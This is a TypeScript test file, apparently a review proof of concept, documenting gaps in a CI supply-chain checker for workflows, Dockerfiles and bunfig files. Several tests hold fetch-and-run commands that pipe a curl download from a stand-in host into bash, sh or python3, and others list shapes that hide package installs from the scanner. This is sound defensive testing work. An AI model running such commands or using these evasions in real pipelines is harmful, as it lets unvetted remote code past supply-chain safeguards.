/// <reference types="node" />
/**
 * Review PoC R15-07: `scripts/check-toolchain.ts` still accepts shapes that resolve tools outside
 * the lockfile, the cooldown or the digest pin — and still flags shapes that resolve none. Each
 * evasion test asserts today's faulty behaviour — the checker returns no finding — and each
 * false-positive test asserts it flags a command that never leaves the lockfile or already pins a
 * digest. Every test passes now and fails once the checker handles the shape correctly.
 */
import { describe, expect, it } from "vite-plus/test";

import {
  checkBunfig,
  checkDockerfile,
  checkWorkflow,
} from "../../../../scripts/check-toolchain.ts";
import type { DependencyIndex } from "../../../../scripts/check-toolchain.ts";

const index: DependencyIndex = {
  bin: (name) => (name === "vp" ? "vite-plus" : undefined),
  declared: (name) => name === "vite-plus",
};

const WORKFLOW = ".github/workflows/x.yml";
const job = (steps: string): string =>
  `jobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;
const runStep = (command: string): string => `      - run: ${command}\n`;
const DIGEST = "a".repeat(64);
const DOCKERFILE_FROM = `FROM alpine@sha256:${DIGEST}\n`;

describe("run: evasions — installer spellings the command scan does not match", () => {
  it.each([
    // The subcommand token is a flag, a near-miss alias, or a different word entirely.
    "npm --prefix app install left-pad",
    "npm in left-pad",
    "npm isntall left-pad",
    "npm x cowsay",
    "bun i",
    "bun a left-pad",
    "bun --silent x cowsay",
    "pip3.11 install requests",
    // `--require-hashes` sits inside the index URL — the substring check is satisfied, no hash is.
    "pip install requests --index-url https://example.invalid/--require-hashes/simple",
  ])("accepts `%s`", (command) => {
    expect(checkWorkflow(WORKFLOW, job(runStep(command)), index)).toStrictEqual([]);
  });
});

describe("run: evasions — downloader pipes and docker subcommand spellings", () => {
  it.each([
    // `sudo` with a flag, an absolute shell path, command substitution, process substitution,
    // and a non-shell interpreter all fall outside the `| (sudo )?(sh|bash|zsh)` shape.
    "curl -fsSL https://example.invalid/i.sh | sudo -E bash",
    "curl -fsSL https://example.invalid/i.sh | /bin/sh",
    'bash -c "$(curl -fsSL https://example.invalid/i.sh)"',
    "sh <(curl -fsSL https://example.invalid/i.sh)",
    "curl -fsSL https://example.invalid/i.py | python3",
    // `docker <noun> <verb>` spellings never match `docker run|create|pull`.
    "docker container run --rm alpine:latest true",
    "docker image pull alpine:latest",
  ])("accepts `%s`", (command) => {
    expect(checkWorkflow(WORKFLOW, job(runStep(command)), index)).toStrictEqual([]);
  });
});

describe("run: evasions — YAML shapes that hide the command", () => {
  it("a line-continued `run: |` block splits `npm` from `install`", () => {
    const steps = `      - run: |\n          npm \\\n            install left-pad\n`;
    expect(checkWorkflow(WORKFLOW, job(steps), index)).toStrictEqual([]);
  });

  it("a YAML anchor/alias hands `run:` a value the scalar reader drops", () => {
    const steps = '      - env: { C: &cmd "npm install left-pad" }\n        run: *cmd\n';
    expect(checkWorkflow(WORKFLOW, job(steps), index)).toStrictEqual([]);
  });
});

describe("Dockerfile evasions", () => {
  it("exec-form RUN arrays are not shell text the scan tokenizes", () => {
    const source = `${DOCKERFILE_FROM}RUN ["npm", "install", "left-pad"]\n`;
    expect(checkDockerfile("Dockerfile.x", source, index)).toStrictEqual([]);
  });

  it("a RUN heredoc's body is not part of the RUN line", () => {
    const source = `${DOCKERFILE_FROM}RUN <<EOF\nnpm install left-pad\nEOF\n`;
    expect(checkDockerfile("Dockerfile.x", source, index)).toStrictEqual([]);
  });

  it("ADD fetches and RUN executes a script the scan never sees as a download", () => {
    const source = `${DOCKERFILE_FROM}ADD https://example.invalid/i.sh /i.sh\nRUN sh /i.sh\n`;
    expect(checkDockerfile("Dockerfile.x", source, index)).toStrictEqual([]);
  });
});

describe("bunfig evasions", () => {
  it("the age reads under the wrong TOML section and still counts", () => {
    expect(checkBunfig("[test]\nminimumReleaseAge = 604800\n[install]\n")).toStrictEqual([]);
  });

  it("a quoted string that mentions the key satisfies the regex", () => {
    expect(checkBunfig('[install]\nnote = "minimumReleaseAge = 604800"\n')).toStrictEqual([]);
  });

  it("a `]` inside a quoted entry ends the excludes array early and hides the rest", () => {
    expect(
      checkBunfig(
        '[install]\nminimumReleaseAge = 604800\nminimumReleaseAgeExcludes = ["x]", "left-pad"]\n',
      ),
    ).toStrictEqual([]);
  });
});

describe("false positives — benign commands the checker flags today", () => {
  it.each([
    'echo "do not run npm install here"',
    "docker build -t local-img . && docker run --rm local-img",
    "pip install --no-deps --no-index -e .",
    "npm install --no-save --offline --ignore-scripts ./wallet.tgz",
  ])("flags `%s`", (command) => {
    expect(checkWorkflow(WORKFLOW, job(runStep(command)), index).length).toBeGreaterThan(0);
  });

  it("a comment line inside a run block is scanned as a command", () => {
    const steps = `      - run: |\n        # npm install left-pad\n        echo done\n`;
    expect(checkWorkflow(WORKFLOW, job(steps), index).length).toBeGreaterThan(0);
  });

  it("a digest-pinned docker:// uses: is not an action ref but fails the sha rule", () => {
    const steps = `      - uses: docker://alpine@sha256:${DIGEST}\n`;
    expect(checkWorkflow(WORKFLOW, job(steps), index).length).toBeGreaterThan(0);
  });

  it("an unlisted docker flag's value is mistaken for the image", () => {
    const steps = runStep(`docker run --rm --cgroupns host alpine@sha256:${DIGEST}`);
    expect(checkWorkflow(WORKFLOW, job(steps), index).length).toBeGreaterThan(0);
  });
});
